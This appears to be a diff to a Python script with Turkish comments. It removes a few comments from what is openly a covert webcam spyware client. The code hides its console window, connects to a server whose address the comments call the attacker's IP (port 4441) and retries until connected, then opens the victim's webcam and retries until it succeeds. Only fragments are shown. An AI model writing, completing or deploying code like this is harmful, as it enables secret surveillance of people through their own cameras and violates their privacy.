@@ -10,7 +10,7 @@ SERVER_IP = '192.168.1.5'  # Saldirgan bilgisayarinin IP adresini gir
 SERVER_PORT = 4441
 
 def hide_console():
-    # Eger zaten pythonw.exe ile calisiyorsa, hicbir sey yapma.
+    
     if sys.executable.lower().endswith("pythonw.exe"):
         return
     try:
@@ -36,7 +36,7 @@ def connect_to_server():
             time.sleep(5)
 
 def init_camera():
-    # DirectShow kullanarak kamera acmaya calis (MSMF hatalarini azaltmak icin)
+    
     cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
     while not cap.isOpened():
         print("[HATA] Kamera acilamadi! 5 saniye sonra tekrar denenecek...")
@@ -47,7 +47,7 @@ def init_camera():
     print("[INFO] Kamera basariyla acildi.")
     return cap
 
-hide_console()  # Script arka planda calissin.
+hide_console()  
 s = connect_to_server()
 cap = init_camera()
 
